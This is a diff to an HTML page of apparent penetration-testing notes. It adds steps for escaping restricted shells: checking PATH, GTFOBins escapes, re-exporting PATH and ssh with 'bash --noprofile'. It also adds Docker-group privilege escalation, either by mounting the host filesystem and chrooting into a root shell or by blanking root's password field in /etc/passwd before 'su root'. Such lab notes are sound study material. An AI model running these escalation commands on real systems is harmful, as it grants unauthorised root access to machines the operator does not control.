@@ -317,15 +317,28 @@ void main(){
 
                     <h2 id="Escaping restricted shells">Escaping restricted shells</h2>
                     <ul>
-                        <p>In some cases you'll find out that you land on a shell which is restricted, there are some bypases we can perform. Some payloads are</p>
-                        <pre><code class="language-bash">ls -l `pwd`</code></pre>
-                        <p>Using... between commands</p>
-                        <pre><code class="language-bash">| ; && `</code></pre>
-                        <p>Modifying or creating environment variables</p>
-                        <p>In rbash you can list the available commands by doing:</p>
-                        <pre><code class="language-bash">compgen -c</code></pre>
-                        <p>A basic way to scape is by connecting through ssh by using <b>--noprofile</b></p>
-                        <pre><code class="language-bash"> ssh psj@server_name -t "bash --noprofile"</code></pre>
+                        <p>In some cases you'll find out that you land on a shell which is restricted, You will know it because you won't be able to use any command and any time you do so the terminal will desplay an error not found message</p>
+                        <p>The first thing you must do is checking the PATH</p>
+                        <pre><code class="language-bash">echo $PATH</code></pre>
+                        <p>This will show the directories where the system looks for executables. Go inside one of them and look which tools/commands are available. Then identify shell escapes for that commands using GTFO bins <a class="notion-link" href="https://web.archive.org/web/20260102075820/https://gtfobins.github.io/" target="_blank">here</a></p>
+                        <p>Once you scaped the shell with any tool you might as well not being able to run commands. In that case export the bin directory to the path</p>
+                        <pre><code class="language-bash">export PATH=/usr/bin:/bin:$PATH</code></pre>
+
+                        <p>Here are some other useful methods you might want to try: </p>
+                        <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>Here you have a website with some other methods <a class="notion-link" href="https://exploitnotes.org/exploit/network/protocol/restricted-shell-bypass" target="_blank">here</a></p>
+                                    <pre><code class="language-bash">ls -l `pwd`</code></pre>
+                                    <p>Using... between commands</p>
+                                    <pre><code class="language-bash">| ; && `</code></pre>
+                                    <p>Modifying or creating environment variables</p>
+                                    <p>In rbash you can list the available commands by doing:</p>
+                                    <pre><code class="language-bash">compgen -c</code></pre>
+                                    <p>A basic way to scape is by connecting through ssh by using <b>--noprofile</b></p>
+                                    <pre><code class="language-bash"> ssh psj@server_name -t "bash --noprofile"</code></pre>    
+                                </div> 
+
+                        
                     </ul> 
 
 
@@ -585,7 +598,28 @@ lxc exec privesc /bin/sh</code></pre>
                         <h4>Docker group</h4>
                         <ul>
                             <p>In case you are in docker group youll be able to read any file on the system. By running the following command youll create a new container mounting the /root folder</p>
+                            <p>Since your box is likely to not have internet connection just use an image wich was already downloaded in the target machine</p>
                             <pre><code class="language-bash">docker run -v /root:/mnt -it ubuntu</code></pre>
+                            <p>Then access the container and go to /mnt folder</p>
+                            <pre><code class="language-bash">docker exec -it e291179f4899 /bin/bash</code></pre>
+                            <p>Here are two easy options to escalate privileges:</p>
+
+                            <div class="button" onclick="toggleDiv()">Interactive shell as root by creating a new container</div>
+                                <div id="foldedDiv" class="content">
+                                    <pre><code class="language-bash">docker run -v /:/mnt --rm -it redmine chroot /mnt sh</code></pre>    
+                                    <p>In this case we are mounting all the host filesystem. With the <b>--rm</b> the container will be deleted after it exits, the <b>chroot /mnt sh</b></p>
+                                </div> 
+                            <br>
+                            <div class="button" onclick="toggleDiv()">Modfying /etc/passwd</div>
+                                <div id="foldedDiv" class="content">
+                                    <pre><code class="language-bash">docker run -v /etc:/mnt -it ubuntu</code></pre>
+                                    <p>Read the /etc/passwd file and copy it into your attacker box</p>
+                                    <p>Then just remove the <b>x</b> from the root line and copy it back to the container (meaning tranfer the file with python server)</p>
+                                    <p>Exit the container and perform <b>su root</b> without needing a password</p>
+                                    <pre><code class="language-bash">su root</code></pre>    
+                                </div>     
+
+
 
                             <h5>Shared folders</h5>
                             <ul>
